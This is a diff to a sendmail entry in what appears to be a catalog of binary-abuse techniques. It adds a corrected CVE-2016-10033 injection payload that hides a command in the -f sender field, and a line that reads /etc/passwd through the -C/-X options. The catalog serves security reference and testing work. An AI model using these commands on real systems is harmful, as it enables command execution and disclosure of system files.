@@ -7,6 +7,10 @@ functions:
         sendmail -be '${run{/bin/sh -c "uname -a"}{yes}{no}}'
     - description: See [\"PoC HTTP request / minimal PoC exploit\"](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html) for more information about this exploit. This example runs `uname -a`.
       code: |
-        sendmail -t -i -femail@address.com(tmp1 -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}uname${substr{10}{1}{$tod_log}}-a$}}' tmp2)
+        sendmail -t -i -f 'email@address.com(tmp1' -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}uname${substr{10}{1}{$tod_log}}-a$}}' 'tmp2)'
 
+  file-upload:
+    - description: Arbitrary files can be delivered.
+      code: |
+        sendmail -t -i -f mail@address.com -C/etc/passwd -X/dev/null < mail.txt
 ---
